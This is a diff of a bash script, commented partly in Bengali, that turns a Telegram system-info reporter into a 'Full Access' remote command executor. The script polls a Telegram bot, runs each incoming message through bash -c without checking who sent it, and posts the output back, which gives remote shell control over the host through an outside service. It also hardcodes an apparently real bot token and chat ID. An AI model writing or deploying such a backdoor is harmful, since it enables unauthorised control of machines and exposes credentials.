@@ -1,30 +1,38 @@
 #!/bin/bash
-# Simple Linux System Info → Send to Telegram
+# Telegram Remote Command Executor (Full Access)
+# Personal use only
 
-# 🔧 তোমার Telegram Bot Token আর Chat ID বসাতে হবে
 BOT_TOKEN="7888336988:AAFzsewYXVT0Grxx7fQwKydxcKNMlUkLXqk"
 CHAT_ID="5634946920"
 
-# সিস্টেম ইনফো সংগ্রহ
-INFO=$(echo -e "
-🖥 Linux System Report
+LAST_UPDATE_ID=0
 
-👤 User: $(whoami)
-💻 Hostname: $(hostname)
-🖥 OS: $(uname -o) $(uname -r)
-⏱ Uptime: $(uptime -p)
-📂 Current Dir: $(pwd)
+while true; do
+    # Telegram থেকে নতুন আপডেট আনা
+    UPDATES=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$((LAST_UPDATE_ID+1))")
+    
+    COUNT=$(echo "$UPDATES" | jq '.result | length')
+    
+    if [[ $COUNT -gt 0 ]]; then
+        for ((i=0;i<$COUNT;i++)); do
+            MESSAGE=$(echo "$UPDATES" | jq -r ".result[$i].message.text")
+            UPDATE_ID=$(echo "$UPDATES" | jq -r ".result[$i].update_id")
+            CHAT=$(echo "$UPDATES" | jq -r ".result[$i].message.chat.id")
 
-💾 Disk Usage:
-$(df -h / | tail -n 1)
+            # কমান্ড এক্সিকিউট
+            OUTPUT=$(bash -c "$MESSAGE" 2>&1)
 
-📦 Memory Usage:
-$(free -h | grep Mem)
+            # আউটপুট Telegram এ পাঠানো
+            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+                 -d chat_id="$CHAT" \
+                 -d reply_to_message_id="$(echo "$UPDATES" | jq -r ".result[$i].message.message_id")" \
+                 -d text="💻 Command: $MESSAGE
+----------------
+$OUTPUT"
 
-🌐 IP Address: $(hostname -I | awk '{print $1}')
-")
+            LAST_UPDATE_ID=$UPDATE_ID
+        done
+    fi
 
-# Telegram এ পাঠানো
-curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-     -d chat_id="$CHAT_ID" \
-     -d text="$INFO"
+    sleep 2
+done
